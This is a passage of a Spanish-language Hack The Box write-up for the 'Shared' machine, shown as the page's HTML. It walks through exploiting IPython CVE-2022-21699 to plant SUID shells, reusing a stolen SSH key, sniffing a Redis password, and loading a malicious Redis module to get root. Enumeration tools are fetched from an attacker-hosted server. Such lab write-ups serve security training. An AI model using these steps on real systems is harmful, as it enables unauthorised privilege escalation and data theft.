<span class=line><span style=color:#e1e4e8>lhost</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"10.10.14.10"</span><span style=color:#6a737d> # Listener host</span></span>
<span class=line><span style=color:#79b8ff>cd</span><span style=color:#e1e4e8> $(</span><span style=color:#b392f0>mktemp</span><span style=color:#79b8ff> -d</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>wget</span><span style=color:#79b8ff> \</span></span>
<span class=line><span style=color:#9ecbff>	"https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64"</span><span style=color:#79b8ff> \</span></span>
<span class=line><span style=color:#9ecbff>	"https://github.com/carlospolop/PEASS-ng/releases/download/20220522/linpeas.sh"</span></span>
<span class=line><span style=color:#b392f0>php</span><span style=color:#79b8ff> -S</span><span style=color:#e1e4e8> $lhost</span><span style=color:#9ecbff>:80</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># james_mason@shared.htb (SSH)</span></span>
<span class=line><span style=color:#e1e4e8>lhost</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"10.10.14.10"</span><span style=color:#6a737d> # Attacker's IP address</span></span>
<span class=line><span style=color:#b392f0>mkdir</span><span style=color:#9ecbff> .sneak</span><span style=color:#e1e4e8> &#x26;&#x26; </span><span style=color:#79b8ff>cd</span><span style=color:#9ecbff> .sneak</span></span>
<span class=line><span style=color:#b392f0>wget</span><span style=color:#9ecbff> "http://</span><span style=color:#e1e4e8>$lhost</span><span style=color:#9ecbff>/pspy64"</span><span style=color:#9ecbff> "http://</span><span style=color:#e1e4e8>$lhost</span><span style=color:#9ecbff>/linpeas.sh"</span></span>
<span class=line><span style=color:#b392f0>bash</span><span style=color:#9ecbff> ./linpeas.sh</span><span style=color:#f97583> |</span><span style=color:#b392f0> tee</span><span style=color:#9ecbff> linpeas.log</span></span>
<span class=line></span></code></pre><p>No obtenemos nada que destaque en la salida de LinPEAS. Intentemos ejecutar PSpy durante unos minutos.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># james_mason@shared.htb (SSH)</span></span>
<span class=line><span style=color:#b392f0>chmod</span><span style=color:#9ecbff> +x</span><span style=color:#9ecbff> pspy64</span></span>
<span class=line><span style=color:#b392f0>timeout</span><span style=color:#9ecbff> 3m</span><span style=color:#9ecbff> ./pspy64</span><span style=color:#f97583> |</span><span style=color:#b392f0> tee</span><span style=color:#9ecbff> pspy.log</span></span>
<span class=line></span></code></pre><p>Mirando la salida, el UID 0 y el UID 1001 parecen estar ejecutando comandos rutinarios. El UID 0 es root y el ID de usuario 1001 resulta ser el usuario dan_smith, declarado en <code>/etc/passwd{:.filepath}</code>. Se puede observar que dan_smith ejecuta un comando interesante cada minuto.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>/bin/sh</span><span style=color:#79b8ff> -c</span><span style=color:#9ecbff> /usr/bin/pkill</span><span style=color:#9ecbff> ipython</span><span style=color:#e1e4e8>; </span><span style=color:#79b8ff>cd</span><span style=color:#9ecbff> /opt/scripts_review/</span><span style=color:#e1e4e8> &#x26;&#x26; </span><span style=color:#b392f0>/usr/local/bin/ipython</span></span>
<span class=line></span></code></pre><p>El usuario entra en el directorio <code>/opt/scripts_review{:.filepath}</code> y ejecuta <code>/usr/local/bin/ipython{:.filepath}</code>.</p><h3 id=cve-2022-21699>CVE-2022-21699<a href=#cve-2022-21699 class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Tras investigar un poco sobre ipython, nos encontramos con un aviso de vulnerabilidad que detalla un fallo de ejecución de código.</p><blockquote><p>Nos gustaría revelar una vulnerabilidad de ejecución de código arbitrario en IPython que proviene de IPython ejecutando archivos no confiables en CWD. Esta vulnerabilidad permite a un usuario ejecutar código como otro.</p></blockquote><p>Comprobemos si la versión de la máquina es vulnerable.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># james_mason@shared.htb (SSH)</span></span>
<span class=line><span style=color:#b392f0>/usr/local/bin/ipython</span><span style=color:#79b8ff> --version</span></span>
<span class=line></span></code></pre><p>La versión es 8.0.0, que es vulnerable. Dado que el comando de rutina ejecutado por dan_smith se ejecuta en el directorio <code>/opt/scripts_review{:.filepath}</code>, podríamos explotar la vulnerabilidad si <code>/opt/scripts_review{:.filepath}</code> es escribible.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># james_mason@shared.htb (SSH)</span></span>
<span class=line><span style=color:#b392f0>ls</span><span style=color:#79b8ff> -la</span><span style=color:#9ecbff> /opt/scripts_review</span></span>
<span class=line></span></code></pre><p>Es escribible por aquellos en el grupo de desarrolladores. Según la salida del comando id, nuestro usuario actual forma parte de este grupo.</p><h3 id=exploitation>Exploitation<a href=#exploitation class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Pongamos a prueba nuestra hipótesis siguiendo las instrucciones del aviso para ejecutar código como <code>dan_smith</code>.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d>#!/bin/bash</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>exploitdir</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"/opt/scripts_review"</span></span>
<span class=line><span style=color:#e1e4e8>cmd</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"cp /bin/sh /tmp/dan_smith_sh;chmod a+xs /tmp/dan_smith_sh"</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>mkdir</span><span style=color:#79b8ff> -m</span><span style=color:#79b8ff> 777</span><span style=color:#9ecbff> "</span><span style=color:#e1e4e8>$exploitdir</span><span style=color:#9ecbff>/profile_default"</span></span>
<span class=line><span style=color:#b392f0>mkdir</span><span style=color:#79b8ff> -m</span><span style=color:#79b8ff> 777</span><span style=color:#9ecbff> "</span><span style=color:#e1e4e8>$exploitdir</span><span style=color:#9ecbff>/profile_default/startup"</span></span>
<span class=line><span style=color:#79b8ff>echo</span><span style=color:#9ecbff> "__import__('os').popen('</span><span style=color:#e1e4e8>$cmd</span><span style=color:#9ecbff>')"</span><span style=color:#f97583> ></span><span style=color:#9ecbff> "</span><span style=color:#e1e4e8>$exploitdir</span><span style=color:#9ecbff>/profile_default/startup/x.py"</span></span>
<span class=line></span></code></pre><p>Después de ejecutar el script y esperar un minuto, nuestro shell SUID debería estar en <code>/tmp/dan_smith_sh{:.filepath}</code>.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># james_mason@shared.htb (SSH)</span></span>
<span class=line><span style=color:#b392f0>/tmp/dan_smith_sh</span><span style=color:#79b8ff> -p</span></span>
<span class=line></span></code></pre><h2 id=privilege-escalation-><span style=color:#33acff>Privilege Escalation </span><a href=#privilege-escalation- class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p>La primera bandera se encuentra en <code>/home/dan_smith/user.txt{:.filepath}</code></p><h3 id=stabilizing-shell>Stabilizing Shell<a href=#stabilizing-shell class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Copiemos el contenido de <code>/home/dan_smith/.ssh/id_rsa{:.filepath}</code> a la máquina atacante y utilicémoslo para iniciar sesión como <code>dan_smith</code> a través de SSH para obtener una shell más estable.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># mhil4ne@kali</span></span>
<span class=line><span style=color:#b392f0>chmod</span><span style=color:#79b8ff> 600</span><span style=color:#9ecbff> dan_smith_id_rsa</span></span>
<span class=line><span style=color:#b392f0>ssh</span><span style=color:#79b8ff> -i</span><span style=color:#9ecbff> dan_smith_id_rsa</span><span style=color:#9ecbff> "dan_smith@</span><span style=color:#e1e4e8>$rhost</span><span style=color:#9ecbff>"</span></span>
<span class=line></span></code></pre><p>Al ejecutar el comando id, nos enteramos de que nuestro usuario actual forma parte del grupo sysadmin. Veamos a qué tiene acceso especial este grupo.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># dan_smith@shared.htb (SSH)</span></span>
<span class=line><span style=color:#b392f0>find</span><span style=color:#9ecbff> /</span><span style=color:#79b8ff> -group</span><span style=color:#9ecbff> sysadmin</span><span style=color:#f97583> 2></span><span style=color:#9ecbff>/dev/null</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>/usr/local/bin/redis_connector_dev</span></span>
<span class=line></span></code></pre><p>Se devuelve un archivo en <code>/usr/local/bin/redis_connector_dev{:.filepath}</code>. Este archivo probablemente tiene algo que ver con una solución de almacenamiento de datos clave-valor conocida como Redis. Cuando ejecutamos <code>/usr/local/bin/redis_connector_dev{:.filepath}</code>, imprime un mensaje de registro que dice «Logging to redis instance using password» y lo que parece la salida de la consulta INFO Server redis.</p><h3 id=redis>Redis<a href=#redis class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Recopilemos información básica sobre el archivo y veamos qué ocurre entre bastidores.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># dan_smith@shared.htb (SSH)</span></span>
<span class=line><span style=color:#b392f0>file</span><span style=color:#9ecbff> /usr/local/bin/redis_connector_dev</span><span style=color:#f97583>|</span><span style=color:#b392f0>tr</span><span style=color:#9ecbff> ','</span><span style=color:#9ecbff> '\n'</span></span>
<span class=line></span></code></pre><p>Basándonos en la salida del comando file, podemos observar algunas cosas sobre el archivo:</p><ul><li>Es un ejecutable ELF x86-64</li><li>se ha compilado con un compilador Go (de ahí el Go BuildID)</li><li>No está despojado</li></ul><p>Dado que el protocolo Redis RESP funciona en texto plano, podríamos capturar la contraseña. En primer lugar, copiemos el archivo en la máquina del atacante.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># mhil4ne@kali</span></span>
<span class=line><span style=color:#b392f0>scp</span><span style=color:#79b8ff> -i</span><span style=color:#9ecbff> dan_smith_id_rsa</span><span style=color:#9ecbff> "dan_smith@</span><span style=color:#e1e4e8>$rhost</span><span style=color:#9ecbff>:/usr/local/bin/redis_connector_dev"</span><span style=color:#9ecbff> .</span></span>
<span class=line><span style=color:#b392f0>chmod</span><span style=color:#9ecbff> +x</span><span style=color:#9ecbff> redis_connector_dev</span></span>
<span class=line></span></code></pre><p>Ejecutando el archivo en la máquina atacante, obtenemos un error quejándonos de que el puerto TCP 6379 está cerrado en la dirección loopback. Podemos abrir ese puerto ejecutando nc en una pestaña separada.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># mhil4ne@kali</span></span>
<span class=line><span style=color:#b392f0>nc</span><span style=color:#79b8ff> -lv</span><span style=color:#79b8ff> 127.0.0.1</span><span style=color:#79b8ff> 6379</span></span>
<span class=line></span></code></pre><p>Ahora si ejecutamos ./redis_connector_dev{:.filepath} obtenemos alguna salida al listener.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>Connection</span><span style=color:#9ecbff> received</span><span style=color:#9ecbff> on</span><span style=color:#9ecbff> localhost</span><span style=color:#79b8ff> 35468</span></span>
<span class=line><span style=color:#f97583>*</span><span style=color:#e1e4e8>2</span></span>
<span class=line><span style=color:#ffab70>$4</span></span>
<span class=line><span style=color:#b392f0>auth</span></span>
<span class=line><span style=color:#e1e4e8>$16</span></span>
<span class=line><span style=color:#e1e4e8>[REDACTED]</span></span>
<span class=line></span></code></pre><p>Se pasan las cadenas auth y [REDACTED]. Dadas las circunstancias, la segunda cadena parece que puede ser la contraseña, así que vamos a intentar usarla con el comando redis-cli en la máquina de destino.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># dan_smith@shared.htb (SSH)</span></span>
<span class=line><span style=color:#b392f0>redis-cli</span><span style=color:#79b8ff> -a</span><span style=color:#9ecbff> "</span><span style=color:#e1e4e8>$password</span><span style=color:#9ecbff>"</span><span style=color:#9ecbff> INFO</span><span style=color:#9ecbff> server</span></span>
<span class=line></span></code></pre><p>El comando de servidor INFO se ejecuta correctamente. Mientras ejecutamos algunos comandos de enumeración adicionales descubrimos que el almacén de redis está prácticamente vacío.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># dan_smith@shared.htb (SSH)</span></span>
<span class=line><span style=color:#b392f0>redis-cli</span><span style=color:#79b8ff> -a</span><span style=color:#9ecbff> "</span><span style=color:#e1e4e8>$password</span><span style=color:#9ecbff>"</span><span style=color:#9ecbff> INFO</span><span style=color:#9ecbff> keyspace</span></span>
<span class=line></span></code></pre><p>Después de algunas investigaciones sobre redis, nos encontramos con esta página que presenta diferentes métodos para lograr RCE en un servidor redis. Esto es útil para nosotros porque el usuario que ejecuta el servidor redis es root, lo que significa que ejecutaremos comandos como root si RCE es posible.</p><p>Un método es cargar un archivo especial de objetos compartidos usando la consulta MODULE LOAD. Podemos construir el objeto compartido desde este código fuente en la máquina atacante, luego copiar <code>module.so{:.filepath}</code> al objetivo.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># james_mason@shared.htb (SSH)</span></span>
<span class=line><span style=color:#e1e4e8>command</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"cp /bin/sh /root_sh;chmod a+xs /root_sh"</span></span>
<span class=line><span style=color:#b392f0>redis-cli</span><span style=color:#79b8ff> -a</span><span style=color:#9ecbff> "</span><span style=color:#e1e4e8>$password</span><span style=color:#9ecbff>"</span><span style=color:#9ecbff> MODULE</span><span style=color:#9ecbff> LOAD</span><span style=color:#9ecbff> ~/module.so</span><span style=color:#e1e4e8> &#x26;&#x26;</span></span>
<span class=line><span style=color:#b392f0>	redis-cli</span><span style=color:#79b8ff> -a</span><span style=color:#9ecbff> "</span><span style=color:#e1e4e8>$password</span><span style=color:#9ecbff>"</span><span style=color:#9ecbff> system.exec</span><span style=color:#9ecbff> "</span><span style=color:#e1e4e8>$command</span><span style=color:#9ecbff>"</span></span>
<span class=line><span style=color:#b392f0>/root_sh</span><span style=color:#79b8ff> -p</span></span>
<span class=line></span></code></pre><p>Ejecutar esto nos debe aterrizar un shell como root donde la última bandera se puede encontrar en <code>/root/root.txt{:.filepath}</code></p></div></div></div><div class="flex w-full gap-4 flex-col mb-4 justify-between md:flex-row overflow-hidden"><a href=/posts/pov/ class="w-full active:scale-95 font-bold overflow-hidden"><div class="flex items-center w-full justify-start btn-card gap-4 h-[3.75rem] max-w-full px-4 rounded-2xl"><svg data-icon=material-symbols:chevron-left-rounded height=1em viewBox="0 0 24 24" width=1em class="text-[var(--primary)] text-[2rem]"><symbol id=ai:material-symbols:chevron-left-rounded><path d="m10.8 12l3.9 3.9q.275.275.275.7t-.275.7t-.7.275t-.7-.275l-4.6-4.6q-.15-.15-.212-.325T8.425 12t.063-.375t.212-.325l4.6-4.6q.275-.275.7-.275t.7.275t.275.7t-.275.7z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:chevron-left-rounded></use></svg><div class="transition whitespace-nowrap dark:text-white/75 max-w-[calc(100%_-_3rem)] overflow-ellipsis overflow-hidden text-black/75">Pov HTB Writeup</div></div></a><a href=/posts/broker/ class="w-full active:scale-95 font-bold overflow-hidden"><div class="flex items-center w-full btn-card gap-4 h-[3.75rem] max-w-full px-4 rounded-2xl justify-end"><div class="transition whitespace-nowrap dark:text-white/75 max-w-[calc(100%_-_3rem)] overflow-ellipsis overflow-hidden text-black/75">Broker HTB Writeup</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="text-[var(--primary)] text-[2rem]"><symbol id=ai:material-symbols:chevron-right-rounded><path d="M12.6 12L8.7 8.1q-.275-.275-.275-.7t.275-.7t.7-.275t.7.275l4.6 4.6q.15.15.213.325t.062.375t-.062.375t-.213.325l-4.6 4.6q-.275.275-.7.275t-.7-.275t-.275-.7t.275-.7z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg></div></a></div></main></div><div class="onload-animation col-span-2 grid-rows-3 mt-4" id=footer><div class="flex items-center card-base max-w-[var(--page-width)] mx-auto min-h-[4.5rem] px-6 rounded-b-none"><div class="transition text-50 text-sm">© 2024 Mil4ne. All Rights Reserved.<br>Powered by <a href="https://github.com/mil4ne?tab=repositories" class="text-[var(--primary)] font-medium link" target=_blank>Mil4ne</a></div></div></div><div class="back-to-top-wrapper hidden lg:block" data-astro-cid-eymb5ayk><div class="transition flex items-center back-to-top-btn hide overflow-hidden rounded-2xl" id=back-to-top-btn data-astro-cid-eymb5ayk onclick=backToTop()><button class="w-[3.75rem] btn-card h-[3.75rem]" aria-label="Back to Top" data-astro-cid-eymb5ayk><svg data-icon=material-symbols:keyboard-arrow-up-rounded height=1em viewBox="0 0 24 24" width=1em class=mx-auto data-astro-cid-eymb5ayk><symbol id=ai:material-symbols:keyboard-arrow-up-rounded><path d="m12 10.8l-3.9 3.9q-.275.275-.7.275t-.7-.275t-.275-.7t.275-.7l4.6-4.6q.3-.3.7-.3t.7.3l4.6 4.6q.275.275.275.7t-.275.7t-.7.275t-.7-.275z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:keyboard-arrow-up-rounded></use></svg></button></div></div><script>function backToTop(){window.scroll({top:0,behavior:"smooth"})}function scrollFunction(){let o=document.getElementById("back-to-top-btn");document.body.scrollTop>600||document.documentElement.scrollTop>600?o.classList.remove("hide"):o.classList.add("hide")}window.onscroll=scrollFunction</script></div></div></body></html>